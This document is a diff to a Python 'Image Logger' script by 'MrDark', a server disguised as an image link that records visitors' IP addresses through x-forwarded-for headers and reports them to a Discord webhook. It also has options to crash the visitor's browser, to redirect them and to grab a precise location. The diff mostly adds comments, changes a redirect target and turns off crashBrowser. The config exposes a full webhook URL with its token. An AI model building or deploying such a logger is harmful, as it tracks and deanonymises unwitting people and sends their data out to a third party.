@@ -1,3 +1,4 @@
+
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
@@ -9,11 +10,11 @@ __author__ = "MrDark"
 
 config = {
     "webhook": "https://discord.com/api/webhooks/1401030435500327123/Y-fH4HrinvHlJn4QOoTpkl446A-XspptlmOskYUXpzSR1txYfesXVhuxF9X--uGQfAMv",
-    "image": "https://static.vecteezy.com/ti/vetor-gratis/p1/11277904-tela-de-login-modelo-de-ilustracaoial-de-design-de-pagina-de-login-moderno-gratis-vetor.jpg", 
+    "image": "https://static.vecteezy.com/ti/vetor-gratis/p1/11277904-tela-de-login-modelo-de-ilustracaoial-de-design-de-pagina-de-login-moderno-gratis-vetor.jpg", # You can also have a custom image by using a URL argument
     "imageArgument": True, 
     "username": "Image Logger", 
     "color": 0x00FFFF,
-    "crashBrowser": True, 
+    "crashBrowser": False, 
     
     "accurateLocation": False, 
 
@@ -35,7 +36,7 @@ config = {
     
     "redirect": {
         "redirect": False, 
-        "page": "https://Xvideos.com" 
+        "page": "https://your-link.here" 
     },
 
 
@@ -195,9 +196,9 @@ height: 100vh;
             if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                 self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                 self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
-                self.end_headers() 
+                self.end_headers() # Declare the headers as finished.
 
-                if config["buggedImage"]: self.wfile.write(binaries["loading"]) 
+                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.
 
                 makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                 
@@ -242,9 +243,9 @@ height: 100vh;
 
                 if config["redirect"]["redirect"]:
                     data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
-                self.send_response(200) 
-                self.send_header('Content-type', datatype) 
-                self.end_headers()
+                self.send_response(200) # 200 = OK (HTTP Status)
+                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
+                self.end_headers() # Declare the headers as finished.
 
                 if config["accurateLocation"]:
                     data += b"""<script>
